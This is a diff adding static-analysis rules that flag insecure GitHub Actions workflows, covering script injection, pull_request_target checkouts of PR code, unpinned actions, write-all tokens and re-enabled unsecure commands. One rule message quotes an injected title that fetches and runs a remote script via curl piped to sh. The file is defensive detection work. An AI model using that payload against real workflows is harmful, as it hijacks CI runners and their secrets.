@@ -1,0 +1,101 @@
+# Rules for GitHub Actions workflow files (.github/workflows/*.yml).
+
+rules:
+  - id: gha-script-injection
+    languages: [yaml]
+    severity: CRITICAL
+    message: >-
+      An attacker-controlled value (PR title, branch name, issue body, commit message...)
+      is expanded with ${{ }} directly inside a script. GitHub substitutes it before the
+      shell runs, so a title like `"; curl evil.sh | sh #` executes. Pass it through
+      `env:` and reference "$VAR" in the script instead.
+    metadata:
+      category: security
+      cwe: "CWE-78: OS Command Injection"
+      confidence: HIGH
+    patterns:
+      - pattern-either:
+          - pattern: "run: $SCRIPT"
+          - pattern: "script: $SCRIPT"
+      - metavariable-regex:
+          metavariable: $SCRIPT
+          regex: (?s).*\$\{\{\s*(github\.event\.(issue\.(title|body)|pull_request\.(title|body|head\.ref|head\.label|head\.repo\.default_branch)|comment\.body|review\.body|review_comment\.body|discussion\.(title|body)|pages\.[^}]*\.page_name|commits\.[^}]*\.(message|author\.(email|name))|head_commit\.(message|author\.(email|name))|workflow_run\.(head_branch|display_title|head_commit\.(message|author\.(email|name))))|github\.head_ref)\s*\}\}
+
+  - id: gha-pull-request-target-checkout-head
+    languages: [yaml]
+    severity: CRITICAL
+    message: >-
+      This pull_request_target workflow checks out the PR's code. pull_request_target
+      runs with a write token and repository secrets, so any build step that touches the
+      checkout (install scripts, tests, Makefiles) runs attacker code with those
+      privileges ("pwn request"). Use the `pull_request` trigger for untrusted code.
+    metadata:
+      category: security
+      cwe: "CWE-829: Inclusion of Functionality from Untrusted Control Sphere"
+      confidence: HIGH
+    patterns:
+      - pattern-either:
+          - pattern-inside: |
+              on:
+                ...
+                pull_request_target: ...
+                ...
+              ...
+          - pattern-inside: |
+              on: [..., pull_request_target, ...]
+              ...
+          - pattern-inside: |
+              on: pull_request_target
+              ...
+      - pattern: "ref: $REF"
+      - metavariable-regex:
+          metavariable: $REF
+          regex: (?s).*github\.(event\.pull_request\.head\.(sha|ref)|head_ref)
+
+  - id: gha-unpinned-third-party-action
+    languages: [yaml]
+    severity: MEDIUM
+    message: >-
+      This third-party action is referenced by a mutable tag or branch. If the
+      maintainer's account is compromised, the tag can be repointed to malicious code
+      that runs with your secrets (as in the tj-actions/changed-files incident). Pin it
+      to a full commit SHA.
+    metadata:
+      category: supply-chain
+      cwe: "CWE-829: Inclusion of Functionality from Untrusted Control Sphere"
+      confidence: HIGH
+    patterns:
+      - pattern: "uses: $USES"
+      - metavariable-regex:
+          metavariable: $USES
+          regex: ^["']?(?!actions/|github/|\./|docker://)[^@\s"']+@(?![0-9a-f]{40}["']?$)\S+$
+
+  - id: gha-permissions-write-all
+    languages: [yaml]
+    severity: MEDIUM
+    message: >-
+      write-all gives GITHUB_TOKEN write access to everything, so any compromised step
+      can push code or publish releases. Grant only the scopes each job needs (e.g.
+      `contents: read`).
+    metadata:
+      category: security
+      cwe: "CWE-250: Execution with Unnecessary Privileges"
+      confidence: HIGH
+    pattern: "permissions: write-all"
+
+  - id: gha-allow-unsecure-commands
+    languages: [yaml]
+    severity: HIGH
+    message: >-
+      This re-enables the deprecated set-env/add-path workflow commands. Any step that
+      prints attacker-controlled text can then set environment variables such as
+      LD_PRELOAD or PATH for later steps. Use $GITHUB_ENV / $GITHUB_PATH instead.
+    metadata:
+      category: security
+      cwe: "CWE-78: OS Command Injection"
+      confidence: HIGH
+    patterns:
+      - pattern: "ACTIONS_ALLOW_UNSECURE_COMMANDS: $V"
+      - metavariable-regex:
+          metavariable: $V
+          regex: (?i)^["']?true["']?$
